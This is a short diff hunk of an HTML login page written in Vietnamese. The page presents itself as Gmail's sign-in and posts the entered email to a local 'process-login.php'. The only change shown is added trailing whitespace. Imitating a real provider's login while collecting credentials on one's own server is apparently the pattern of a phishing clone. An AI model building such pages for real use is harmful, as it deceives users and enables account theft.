@@ -21,7 +21,7 @@
         <h4>Đăng nhập</h4>
         <p style="margin-bottom: 8%;">để tiếp tục đến Gmail</p>
        
-        <form class="form-signin" action="process-login.php" method="post">
+        <form class="form-signin" action="process-login.php" method="post"> 
         <input type="email" id="inputEmail" name="txtEmail"   placeholder="Email hoặc số điện thoại" required>
             <p class="invalid-feedback">
                 Please provide a valid zip.
